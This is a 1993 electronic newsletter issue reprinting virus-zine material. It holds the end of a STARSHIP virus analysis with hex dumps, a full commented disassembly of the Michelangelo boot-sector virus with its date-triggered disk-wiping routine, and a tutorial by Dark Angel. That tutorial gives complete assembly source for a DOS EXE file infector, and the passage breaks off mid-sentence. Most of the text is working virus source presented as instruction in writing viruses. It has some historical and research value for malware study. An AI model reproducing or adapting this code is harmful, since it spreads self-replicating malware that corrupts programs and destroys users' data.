presence of  virus. Experienced  programmers may  also inspect
the  program   entry  point   with  DEBUG   and  analyse   the
disassembled listing.

     I also  recommend not  to copy  executable files  on  the
floppies  directly.   Use  archive  utilities  and  then  copy
archives on  the floppies.  This sequence saves disk space and
also preserves  from file  infection. But  this method has one
disadvantage. If the initial file is already infected you will
not be  able to  detect the  presence of  virus because  it is
incorporated into the archive in compressed form.

     The identification  of STARSHIP  virus is complex because
it extensively  uses XOR  coding and uses random masks. In the
infected file 100% of virus is encrypted. On disk - 5/6 and in
memory - approximately 60%. That is very interesting feature -
virus is  not available  in pure form, being variable on disk,
in file and in memory.


     CONCLUSION

     To  my   opinion  the   investigated  virus   is  a  very
interesting program.  Virus code  is highly  optimized on  the
machine-code level.  That was  possibly done to place the code
exactly into  5 sectors  on disk.  Virus uses various software
techniques,   it   has   antitracing   and   antidisassembling
organization,  it  has  no  descriptor.  These  measures  were
effective to  some extent,  because I  have some  problems  in
source reconstruction.  In many  cases the  source seems to be
not fully adequate.

     The present  stage of  virus technology  is characterized
with  the  complexity  of  virus  search,  identification  and
reconstruction. This  tendency to  create complex and sneakily
viruses seems  to be  general. For  example remember  the  XOR
coded 1701  virus group,  the Yankee  Doodle  [5,6]  group  of
viruses (called  also the  TP group  [3]) that  desinfects all
debugged infected files [3,5] and smart Century virus [7], SVC
series that  filters  all  accesses  to  the  directories  and
presents original file size for each infected file.

     The name  of virus  (STARSHIP_1) reveals  the idea of the
author to  extend the series. Be attentive, remember - the use
of backups may save you a vast of time.


     ACKNOWLEDGEMENTS

     I   am   greatly   acknowledged   to   V.V.Snegirev   and
A.G.Yakovlev for  useful discussions.  I also like to thank my
wife Helen for her understanding and support.

     I am aknowledged to Vesselin Bontchev, who read the draft
variant of the paper and made many valuable comments.

     I  also  wish  to  acknowledge  the  sponsorship  of  NPO
"POLITON" (Moscow, USSR).


     REFERENCES

[1]  Dewdney A.K.,     In the  game called  Core  War  hostile
     programs  engage   in  a   battle  of   bits,  Scientific
     American, v.250,  5 (1984) 15-19.
[2]  Cohen F.,     Computer viruses:  theory and  experiments,
     Proc. 2nd  IFIP Int.  Conf. on  Computer Security, (1984)
     143-158.
[3]  Bezrukov N.N.,     Computer virusology. Part 1: Main work
     principles, classification  and catalog of viruses in DOS
     operating system,  Edition 3.6, date 18.07.1990. (In soft
     form : files of 745 kbytes total size, 250p. in Russian).
[4]   McBroom V.,     Computer viruses:  what they are, how to
     protect against  them,  Software  Protection,  v.VIII,  3
     (1989) 1-16.
[5]  Documentation to  VIRUSCAN software  package from  McAfee
     Assosiates. Version 4.3V66. File-SCANV66.DOC, size-38024.
[6]  McAfee J.,     The virus cure, Datamation, v.35, 4 (1989)
     29-40.
[7]  Documentation to  Turbo Anti-Virus  software package from
     CARMEL  Software   Engineering.  Version   6.80A.   File-
     README.DOC, size-65566.
==================================================================

Table 1. Layout and size of virus procedures.
(the box indicates the encrypted memory section)

  Size    Offset (hex)             Description


    3%    000 - 04F      Variables and buffers (see Fig.1)
    5%    050 - 0C1      Interrupt 13h handler
   10%    0C2 - 1C7      Interrupt 21h handler
   11%    1C8 - 312      Active part & check for DOS ready
    2%    313 - 340      Random number generator (RND)
    7%    341 - 3F7      Interrupts 20h, 21h, 27h handlers
 +--- encrypted --------------------------------------------+
 | 25%    3F8 - 692      Infector of EXE/COM file includes: |
 |     9%      3F8 - 4DD      input logic                   |
 |    10%      4DE - 5E9      create infected code          |
 |     6%      5EA - 692      output logic                  |
 |  3%    693 - 6E5      Tables                             |
 |  3%    6E6 - 738      Startup code for EXE/COM           |
 | 12%    739 - 88F      Infect disk                        |
 |  2%    891 - 8BF      Interrupt 01h handler (trace)      |
 | 11%    8C0 - 9D7      PseudoDOS boot and int B0h handler |
 +----------------------------------------------------------+
    4%    9D8 - A4E      Remover of code from videomemory
    2%    A4F - A8F      Buffers (CS, IP, SS, SP, etc.)

=======================================================

Table 2. Minimal and maximal sizes of infected
executable files.
       +-------------+------------------------+
       |  File type  |    Minimal   Maximal   |
       |             |    size      size      |
       +-------------+------------------------+
       |             |                        |
       |   .COM      |    1917      62202     |
       |             |                        |
       |   .EXE      |    1917      512 K     |
       +-------------+------------------------+

==============================================================================

Figure 1. Memory block header (M-block) and memory dump of STARSHIP
virus located in core RAM. Virus uses segment 18FB, and its memory
block is at 18F2:0).

------------------- M-memory block containing virus --------------------------

18F2:0000  4D 08 00 B0 00 0A 00 A3-8E 0B A1 0C 00 A3 90 0B   M...............


------- PSP of file, which termination caused the virus installation ---------

18F3:0000  CD 20 A3 19 00 9A F0 FE-1D F0 2F 01 0B 18 3C 01   . ......../...<.
18F3:0010  0B 18 56 05 0B 18 0B 18-01 01 01 00 02 FF FF FF   ..V.............
18F3:0020  FF FF FF FF FF FF FF FF-FF FF FF FF EE 18 E0 FF   ................
18F3:0030  00 90 14 00 18 00 F3 18-FF FF FF FF 00 00 00 00   ................
18F3:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
18F3:0050  CD 21 CB 00 00 00 00 00-00 00 00 00 00 20 20 20   .!...........
18F3:0060  20 20 20 20 20 20 20 20-00 00 00 00 00 20 20 20           .....
18F3:0070  20 20 20 20 20 20 20 20-00 00 00 00 00 00 00 00           ........

------------------ Here follows the code of virus (CS=18FB) -----------------

18FB:0000  E9 01 10 4E 0A 00 10 00-00 00 00 00 00 42 3A 5C   ...N.........B:\
18FB:0010  54 4D 50 5C 44 52 4F 5A-46 49 4C 41 2E 43 4F 4D   TMP\DROZFILA.COM
18FB:0020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
18FB:0030  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
18FB:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 FF   ................
18FB:0050  E9 93 06 3E 53 54 41 52-53 48 49 50 5F 31 3C 80   ...>STARSHIP_1<.
18FB:0060  FA 80 75 41 83 F9 01 75-3F 0A F6 75 38 80 FC 02   ..uA...u?..u8...
18FB:0070  75 29 1E 50 E8 13 03 58-9C FF 1E B8 04 1F 72 18   u).P...X......r.
18FB:0080  50 56 72 16 B8 01 00 BE-BE 01 26 89 40 02 B0 01   PVr.......&.@...
18FB:0090  26 88 40 01 5E 58 F8 FB-EB 7C 3C 80 FC 03 74 F6   &.@.^X...|<...t.
18FB:00A0  80 FC 05 74 F1 E9 3E 01-80 FE 08 75 F8 51 02 C8   ...t..>....u.Q..
18FB:00B0  80 F9 CC 59 72 EF 80 FD-FE 72 EA 80 FC 02 74 D6   ...Yr....r....t.
18FB:00C0  75 D9 FF F1 E8 9C 2E 80-3E 4F 00 00 75 18 50 1E   u.......>O..u.P.
18FB:00D0  8C C8 2D 09 00 E8 A9 02-A1 3C 00 48 E8 A2 02 2E   ..-......<.H....
18FB:00E0  F6 16 4F 00 1F 58 80 FC-3C 75 31 2E 83 3E 0B 00   ..O..X....
18FB:00F0  00 75 6E E8 6E 00 75 69-9D E8 CC 00 72 18 50 51   .un.n.ui....r.PQ

==================================================================

Figure 2. Dump of pseudoDOS boot sector
(thin line denotes random garbage).

   0000  EB 34 90 4D 53 BF 05 00-CD 13 73 09 32 E4 CD 13   .4.MS.....s.2...
   0010  4F 75 F5 CD 18 C3 B9 01-00 E8 E9 FF 80 3E 00 7E   Ou...........>.~
   0020  EB 75 10 A0 02 7E BB 00-7E E8 97 00 0A E4 74 03   .u...~..~.....t.
   0030  80 EF 02 06 53 CB FA 33-C0 8E D0 BC 00 7C 8B F4   ....S..3.....|..
   0040  8E C0 8E D8 FB FC BF 00-06 B9 00 01 F3 A5 EA 53   ...............S
   0050  06 00 00 B9 37 00 BE D6-06 BF C0 02 F3 A4 BF B0   ....7...........
   0060  04 B9 08 00 F3 A4 1E C5-06 4C 00 AB 8C D8 AB 1F   .........L......
   0070  FE 06 FC 7D A1 FC 7D B9-CC FE BB 00 7C BA 80 08   ...}..}.....|...
   0080  0A C0 74 08 50 B8 01 03-E8 7A FF 58 41 89 0E DB   ..t.P....z.XA...
   0090  02 88 36 DF 02 06 BB 00-BB 8E C3 88 26 E7 02 CD   ..6.........&...
   00A0  B0 26 A2 63 01 26 8C 1E-C2 00 07 FA C7 06 4C 00   .&.c.&........L.
   00B0  B0 04 8C 1E 4E 00 FB BB-00 7C B8 06 02 BA 80 00   ....N....|......
   00C0  E9 53 FF 53 51 B9 0A 0A-32 E4 26 30 07 26 02 27   .S.SQ...2.&0.&.'
   00D0  43 E2 F7 59 5B C3 C4 02-00 00 50 06 53 B8 00 BB   C..Y[.....P.S...
   00E0  8E C0 BB 50 00 26 80 3F-E9 74 1E 52 51 B8 05 02   ...P.&.?.t.RQ...
   00F0  B9 00 00 BA 80 00 9C 2E-FF 1E B8 04 B0 00 B9 0A   ................
   0100  0A 26 30 07 43 E2 FA 59-5A 5B 07 58 CF CD B0 9A   .&0.C..YZ[.X....
                       +--------------------------------+
   0110  5F 00 00 BB EA|1E 0E 1F-8E C0 33 FF 50 FC 32 C0|  _.........3.P.2.
  +--------------------+                                |
  |0120  B9 50 00 F3 AA E8 F6 F7-8B F7 B9 0A 0A F3 A4 E8|  .P..............
  |0130  98 F9 58 FA A3 B5 04 A3-C1 04 B8 90 90 A3 B0 04|  ..X.............
  |0140  A3 BC 04 C7 06 BF 04 C5-00 B8 EB 05 A3 C8 04 B8|  ................
  |0150  EB F4 A3 D4 04 BF CA 04-BE DB 04 06 1E 07 A5 A5|  ................
  |0160  A4 FB A3 D9 04 A3 C8 02-C7 06 E0 02 CD 13 C7 06|  ................
  |0170  E2 02 EB 0D FE 06 D9 02-CD B0 B9 37 00 BF C0 02|  ...........7....
  |0180  1E 07 8C D8 F3 AA 07 1F-C3 B4 62 E8 7A F7 C3 90|  ..........b.z...
  |0190  90 90 90 90 90 90 90 90-90 90 A4 4B 4C EA A6 8C|  ...........KL...
  |01A0  BE 23 54 F4 BC E8 B8 6B-5B F1 B2 EC B2 81 5E F6|  .#T....k[.....^.
  |01B0  88 D0 8C BC 64 CC 8E CC-86 69 6A C2 84 C8 80 6F|  ....d....ij....o
  |01C0  FA 2B C0 8E D0 8E C0 8E-D8 B8 00 7C 8B E0 FB 8B|  .+.........|....
  |01D0  F0 BF 00 7E FC B9 00 01-F3 A5 E9 00 02 B9 10 00|  ...~............
  |01E0  8B 36 85 7E F6 04 80 75-08 83 EE 10 E2 F6 EB 37|  .6.~...u.......7
  |                                   +-----------------+
  |01F0  90 BF BE 07 57 B9 08 00-F3 A5|74 91 05 AD 55 AA   ....W.....t...U.
  +-----------------------------------+

==================================================================
Figure 3. Dispatcher code located at absolute address 0:4B0.


        a) virus code located in videomemory

0000:04B0  CD B0              INT  B0        <== int 13h
0000:04B2  9A 5F 00 00 BB     CALL BB00:005F
0000:04B7  EA 3D A3 00 F0     JMP  F000:A33D

0000:04BC  CD B0              INT  B0        <== int 21h
0000:04BE  9A D6 03 00 BB     CALL BB00:03D6
0000:04C3  EA 60 14 73 02     JMP  0273:1460

0000:04C8  CD B0              INT  B0        <== int 20h
0000:04CA  9A DD 03 00 BB     CALL BB00:03DD
0000:04CF  EA 3F 14 73 02     JMP  0273:143F

0000:04D4  CD B0              INT  B0        <== int 27h
0000:04D6  9A 93 03 00 BB     CALL BB00:0393
0000:04DB  EA 66 63 73 02     JMP  0273:6366


        b) after removing of code from videomemory
           (segment CS=18FB is where virus resides)

0000:04B0  90                 NOP            <== int 13h
0000:04B1  90                 NOP
0000:04B2  9A 5F 00 6D 19     CALL 18FB:005F
0000:04B7  EA 3D A3 00 F0     JMP  F000:A33D

0000:04BC  90                 NOP            <== int 21h
0000:04BD  90                 NOP
0000:04BE  9A C5 00 6D 19     CALL 18FB:00C5
0000:04C3  EA 3D A3 00 F0     JMP  0273:1460

0000:04C8  EB 05              JMP  4CF       <== int 20h
0000:04CA  EA 3F 14 73 02     JMP  0273:143F
0000:04CF  EA 66 63 73 02     JMP  0273:6366
0000:04D4  EB F4              JMP  4CA       <== int 27h

===============================================================
All  corrections and  remarks will be greatly appreciated. Send
information directly via E-mail address (MIG@politon.msk.su) or
in  comp.virus group of USENET (I am monitoring it permanently).

F   .rs mbyt-  tF   .rs mbyt-  tF   .  (What is this? -Ed.)

+++++

40Hex Number 8 Volume 2 Issue 4                                       File 006

;This is a disassembly of the much-hyped michelangelo virus.
;As you can see, it is a derivative of the Stoned virus.  The
;junk bytes at the end of the file are probably throwbacks to
;the Stoned virus.  In any case, it is yet another boot sector
;and partition table infector.

michelangelo    segment byte public
                assume  cs:michelangelo, ds:michelangelo
;Disassembly by Dark Angel of PHALCON/SKISM
                org     0

                jmp     entervirus
highmemjmp      db      0F5h, 00h, 80h, 9Fh
maxhead         db      2                       ;used by damagestuff
firstsector     dw      3
oldint13h       dd      0C8000256h

int13h:
                push    ds
                push    ax
                or      dl, dl                  ;default drive?
                jnz     exitint13h              ;exit if not
                xor     ax, ax
                mov     ds, ax
                test    byte ptr ds:[43fh], 1   ;disk 0 on?
                jnz     exitint13h              ;if not spinning, exit
                pop     ax
                pop     ds
                pushf
                call    dword ptr cs:[oldint13h];first call old int 13h
                pushf
                call    infectdisk              ;then infect
                popf
                retf    2
exitint13h:     pop     ax
                pop     ds
                jmp     dword ptr cs:[oldint13h]

infectdisk:
                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                push    si
                push    di
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     si, 4
readbootblock:
                mov     ax,201h                 ;Read boot block to
                mov     bx,200h                 ;after virus
                mov     cx,1
                xor     dx,dx
                pushf
                call    oldint13h
                jnc     checkinfect             ;continue if no error
                xor     ax,ax
                pushf
                call    oldint13h               ;Reset disk
                dec     si                      ;loop back
                jnz     readbootblock
                jmp     short quitinfect        ;exit if too many failures
checkinfect:
                xor     si,si
                cld
                lodsw
                cmp     ax,[bx]                 ;check if already infected
                jne     infectitnow
                lodsw
                cmp     ax,[bx+2]               ;check again
                je      quitinfect
infectitnow:
                mov     ax,301h                 ;Write old boot block
                mov     dh,1                    ;to head 1
                mov     cl,3                    ;sector 3
                cmp     byte ptr [bx+15h],0FDh  ;360k disk?
                je      is360Kdisk
                mov     cl,0Eh
is360Kdisk:
                mov     firstsector,cx
                pushf
                call    oldint13h
                jc      quitinfect              ;exit on error
                mov     si,200h+offset partitioninfo
                mov     di,offset partitioninfo
                mov     cx,21h                  ;Copy partition table
                cld
                rep     movsw
                mov     ax,301h                 ;Write virus to sector 1
                xor     bx,bx
                mov     cx,1
                xor     dx,dx
                pushf
                call    oldint13h
quitinfect:
                pop     di
                pop     si
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                retn
entervirus:
                xor     ax,ax
                mov     ds,ax
                mov     ss,ax
                mov     ax,7C00h                ;Set stack to just below
                mov     sp,ax                   ;virus load point
                sti
                push    ds                      ;save 0:7C00h on stack for
                push    ax                      ;later retf
                mov     ax,ds:[13h*4]
                mov     word ptr ds:[7C00h+offset oldint13h],ax
                mov     ax,ds:[13h*4+2]
                mov     word ptr ds:[7C00h+offset oldint13h+2],ax
                mov     ax,ds:[413h]            ;memory size in K
                dec     ax                      ;1024 K
                dec     ax
                mov     ds:[413h],ax            ;move new value in
                mov     cl,6
                shl     ax,cl                   ;ax = paragraphs of memory
                mov     es,ax                   ;next line sets seg of jmp
                mov     word ptr ds:[7C00h+2+offset highmemjmp],ax
                mov     ax,offset int13h
                mov     ds:[13h*4],ax
                mov     ds:[13h*4+2],es
                mov     cx,offset partitioninfo
                mov     si,7C00h
                xor     di,di
                cld
                rep     movsb                   ;copy to high memory
                                                ;and transfer control there
                jmp     dword ptr cs:[7C00h+offset highmemjmp]
;destination of highmem jmp
                xor     ax,ax
                mov     es,ax
                int     13h                     ;reset disk
                push    cs
                pop     ds
                mov     ax,201h
                mov     bx,7C00h
                mov     cx,firstsector
                cmp     cx,7                    ;hard disk infection?
                jne     floppyboot              ;if not, do floppies
                mov     dx,80h                  ;Read old partition table of
                int     13h                     ;first hard disk to 0:7C00h
                jmp     short exitvirus
floppyboot:
                mov     cx,firstsector          ;read old boot block
                mov     dx,100h                 ;to 0:7C00h
                int     13h
                jc      exitvirus
                push     cs
                pop     es
                mov     ax,201h                 ;read boot block
                mov     bx,200h                 ;of first hard disk
                mov     cx,1
                mov     dx,80h
                int     13h
                jc      exitvirus
                xor     si,si
                cld
                lodsw
                cmp     ax,[bx]                 ;is it infected?
                jne     infectharddisk          ;if not, infect HD
                lodsw                           ;check infection
                cmp     ax,[bx+2]
                jne     infectharddisk
exitvirus:
                xor     cx,cx                   ;Real time clock get date
                mov     ah,4                    ;dx = mon/day
                int     1Ah
                cmp     dx,306h                 ;March 6th
                je      damagestuff
                retf                            ;return control to original
                                                ;boot block @ 0:7C00h
damagestuff:
                xor     dx,dx
                mov     cx,1
smashanothersector:
                mov     ax,309h
                mov     si,firstsector
                cmp     si,3
                je      smashit
                mov     al,0Eh
                cmp     si,0Eh
                je      smashit
                mov     dl,80h                  ;first hard disk
                mov     maxhead,4
                mov     al,11h
smashit:
                mov     bx,5000h                ;random memory area
                mov     es,bx                   ;at 5000h:5000h
                int     13h                     ;Write al sectors to drive dl
                jnc     skiponerror             ;skip on error
                xor     ah,ah                   ;Reset disk drive dl
                int     13h
skiponerror:
                inc     dh                      ;next head
                cmp     dh,maxhead              ;2 if floppy, 4 if HD
                jb      smashanothersector
                xor     dh,dh                   ;go to next head/cylinder
                inc     ch
                jmp     short smashanothersector
infectharddisk:
                mov     cx,7                    ;Write partition table to
                mov     firstsector,cx          ;sector 7
                mov     ax,301h
                mov     dx,80h
                int     13h
                jc      exitvirus
                mov     si,200h+offset partitioninfo ;Copy partition
                mov     di,offset partitioninfo      ;table information
                mov     cx,21h
                rep     movsw
                mov     ax,301h                 ;Write to sector 8
                xor     bx,bx                   ;Copy virus to sector 1
                inc     cl
                int     13h
;*              jmp     short 01E0h
                db      0EBh, 32h               ;?This should crash?
;The following bytes are meaningless.
garbage         db      1,4,11h,0,80h,0,5,5,32h,1,0,0,0,0,0,53h
partitioninfo:  db      42h dup (0)
michelangelo    ends
                end

------------------------------

End of Chaos Digest #1.68
************************************

Chaos Digest              Samedi 3 Juillet 1993        Volume 1 : Numero 69
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.69 (3 Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #007-008(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #007-008(1) (reprint)


40Hex Number 8 Volume 2 Issue 4                                       File 007

                  _______________________________________
                  An Introduction to Nonoverwriting Virii
                          Part II: EXE Infectors
                               By Dark Angel
                  _______________________________________

     In the  last issue  of 40Hex,  I presented  theory and  code  for  the
nonoverwriting  COM   infector,  the   simplest  of  all  parasitic  virii.
Hopefully, having  learned COM  infections cold,  you are now ready for EXE
infections.  There is a grey veil covering the technique of EXE infections,
as the majority of virii are COM-only.

     EXE infections  are, in  some  respects,  simpler  than  COM  viruses.
However, to  understand the infection, you must understand the structure of
EXE files  (naturally).   EXE files  are structured into segments which are
loaded consecutively  atop one  another.  Thus, all an EXE infector must do
is create  its own  segment in  the EXE  file and  alter  the  entry  point
appropriately.   Therefore, EXE  infections do  not require  restoration of
bytes of  code, but  rather involve  the manipulation  of the  header which
appears in  the beginning every EXE file and the appending of viral code to
the infected file.  The format of the header follows:

 Offset Description
   00   ID word, either 'MZ' or 'ZM'
   02   Number of bytes in the last (512 byte) page in the image
   04   Total number of 512 byte pages in the file
   06   Number of entries in the segment table
   08   Size of the header in (16 byte) paragraphs
   0A   Minimum memory required in paragraphs
   0C   Maximum memory requested in paragraphs
   0E   Initial offset in paragraphs to stack segment from header
   10   Initial offset in bytes of stack pointer from stack segment
   12   Negative checksum (ignored)
   14   Initial offset in bytes of instruction pointer from code segment
   16   Initial offset in paragraphs of code segment from header
   18   Offset of relocation table from start of file
   1A   Overlay number (ignored)

The ID  word is  generally 'ZM'  (in the  Intel little-endian format).  Few
files start  with the  alternate form,  'MZ' (once  again in  Intel little-
endian format).   To  save space, a check for the alternate form of the EXE
ID in  the virus  may be omitted, although a few files may be corrupted due
to this omission.

The words  at offsets  2 and  4 are related.  The word at offset 4 contains
the filesize  in pages.   A  page is  a 512 byte chunk of memory, just as a
word is  a two  byte chunk of memory.  This number is rounded up, so a file
of length  514 bytes  would contain a 2 at offset 4 in the EXE header.  The
word at offset 2 is the image length modulo 512.  The image length does not
include the  header length.   This  is one of the bizarre quirks of the EXE
header.   Since the header length is usually a multiple of 512 anyway, this
quirk usually  does not  matter.  If the word at offset 2 is equal to four,
then it  is generally  ignored (heck,  it's never really used anyway) since
pre-1.10 versions  of the  Microsoft linker had a bug which caused the word
to always  be equal  to four.  If you are bold, the virus can set this word
to 4.   However, keep in mind that this was a bug of the linker and not all
command interpreters may recognise this quirk.

The minimum memory required by the program (offset A) can be ignored by the
virus, as  the maximum  memory is generally allocated to the program by the
operating system.   However,  once again,  ignoring this area of the header
MAY cause  an unsucessful  infection.   Simply adding  the  virus  size  in
paragraphs to this value can nullify the problem.

The words  representing the  initial stack segment and pointer are reversed
(not in  little-endian format).   In  other words,  an LES to this location
will yield  the stack  pointer in  ES and  the  stack  segment  in  another
register.   The initial  SS:SP is  calculated  with  the  base  address  of
0000:0000 being at the end of the header.

Similarly, the  initial CS:IP  (in little-endian format) is calculated with
the base  address of  0000:0000 at  the end of the header.  For example, if
the program  entry point  appears directly after the header, then the CS:IP
would be 0000:0000.  When the program is loaded, the PSP+10 is added to the
segment value (the extra 10 accounts for the 100h bytes of the PSP).

All the  relevant portions  of the  EXE header  have been covered.  So what
should be  done to  write a  nonoverwriting EXE infector?  First, the virus
must be appended to the end of the file.  Second, the initial CS:IP must be
saved and  subsequently changed  in the  header.   Third, the initial SS:SP
should also  be saved  and changed.   This  is to avoid any possible memory
conflicts from  the stack  overwriting viral  code.   Fourth, the file size
area of  the header should be modified to correctly reflect the new size of
the file.   Fifth,  any additional  safety modifications such as increasing
the minimum  memory allocation  should be made.  Last, the header should be
written to the infected file.

There are  several good areas for ID bytes in the EXE header.  The first is
in the stack pointer field.  Since it should be changed anyway, changing it
to a  predictable number  would add nothing to the code length.  Make sure,
however, to  make the stack pointer high enough to prevent code overwrites.
Another common  area for ID bytes is in the negative checksum field.  Since
it is  an unused  field, altering  it won't  affect the  execution  of  any
programs.

One further item should be mentioned before the code for the EXE infector.
It is important to remember that EXE files are loaded differently than COM
files.  Although a PSP is still built, the initial CS does NOT point to it.
Instead, it points to wherever the entry point happens to be.  DS and ES
point to the PSP, and therefore do NOT point to the entry point (your virus
code).  It is important to restore DS and ES to their proper values before
returning control to the EXE.

----cut here---------------------------------------------------------------

.model tiny                             ;Handy TASM directive
.code                                   ;Virus code segment
          org 100h                      ;COM file starting IP
;Cheesy EXE infector
;Written by Dark Angel of PHALCON/SKISM
;For 40Hex Number 8 Volume 2 Issue 4
id = 'DA'                               ;ID word for EXE infections

startvirus:                             ;virus code starts here
          call next                     ;calculate delta offset
next:     pop  bp                       ;bp = IP next
          sub  bp,offset next           ;bp = delta offset

          push ds
          push es
          push cs                       ;DS = CS
          pop  ds
          push cs                       ;ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
          movsw

          mov  ah,1Ah                   ;Set new DTA
          lea  dx,[bp+newDTA]           ;new DTA @ DS:DX
          int  21h

          lea  dx,[bp+exe_mask]
          mov  ah,4eh                   ;find first file
          mov  cx,7                     ;any attribute
findfirstnext:
          int  21h                      ;DS:DX points to mask
          jc   done_infections          ;No mo files found

          mov  al,0h                    ;Open read only
          call open

          mov  ah,3fh                   ;Read file to buffer
          lea  dx,[bp+buffer]           ;@ DS:DX
          mov  cx,1Ah                   ;1Ah bytes
          int  21h

          mov  ah,3eh                   ;Close file
          int  21h

checkEXE: cmp  word ptr [bp+buffer+10h],id ;is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ;find next file
          jmp  short findfirstnext
done_infections:
          mov  ah,1ah                   ;restore DTA to default
          mov  dx,80h                   ;DTA in PSP
          pop  es
          pop  ds                       ;DS->PSP
          int  21h
          mov  ax,es                    ;AX = PSP segment
          add  ax,10h                   ;Adjust for PSP
          add  word ptr cs:[si+jmpsave+2],ax
          add  ax,word ptr cs:[si+stacksave+2]
          cli                           ;Clear intrpts for stack manip.
          mov  sp,word ptr cs:[si+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ;jmp ssss:oooo
jmpsave             dd ?                ;Original CS:IP
stacksave           dd ?                ;Original SS:SP
jmpsave2            dd 0fff00000h       ;Needed for carrier file
stacksave2          dd ?

creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
virusname           db '[DemoEXE] for 40Hex',0

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ;Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ;Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ;Get header size
          mov  cl, 4                        ;convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26];Get file size
          mov  dx, es                   ;to DX:AX
          push ax
          push dx

          sub  ax, bx                   ;Subtract header size from
          sbb  dx, 0                    ;file size

          mov  cx, 10h                  ;Convert to segment:offset
          div  cx                       ;form

          mov  word ptr [bp+buffer+14h], dx ;New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ;and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ;get file length
          pop  ax

          add  ax, heap-startvirus      ;add virus size
          adc  dx, 0

          mov  cl, 9                    ;2**9 = 512
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax                   ;filesize in pages
          pop  ax
          and  ah, 1                    ;mod 512

          mov  word ptr [bp+buffer+4], dx ;new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ;restore ES
          pop  es

          mov  cx, 1ah
finishinfection:
          push cx                       ;Save # bytes to write
          xor  cx,cx                    ;Clear attributes
          call attributes               ;Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ;Write to file
          lea  dx,[bp+buffer]           ;Write from buffer
          pop  cx                       ;cx bytes
          int  21h

          mov  ax,4202h                 ;Move file pointer
          xor  cx,cx                    ;to end of file
          cwd                           ;xor dx,dx
          int  21h

          mov  ah,40h                   ;Concatenate virus
          lea  dx,[bp+startvirus]
          mov  cx,heap-startvirus       ;# bytes to write
          int  21h

          mov  ax,5701h                 ;Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ;time
          mov  dx,word ptr [bp+newDTA+18h] ;date
          int  21h

          mov  ah,3eh                   ;Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ;Restore original
          call attributes                 ;attributes

mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ;filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ;Set attributes to cx
          lea  dx,[bp+newDTA+30]        ;filename in DTA
          int  21h
          ret

exe_mask            db '*.exe',0
heap:                                   ;Variables not in code
newDTA              db 42 dup (?)       ;Temporary DTA
buffer              db 1ah dup (?)      ;read buffer
endheap:                                ;End of virus

end       startvirus

----cut here---------------------------------------------------------------

This is a simple EXE infector.  It has limitations;for example, it does
not handle misnamed COM files.  This can be remedied by a simple check:

  cmp [bp+buffer],'ZM'
  jnz misnamed_COM
continueEXE:

Take special notice of the done_infections and infect_exe procedures.  They
handle all  the relevant portions of the EXE infection.  The restoration of
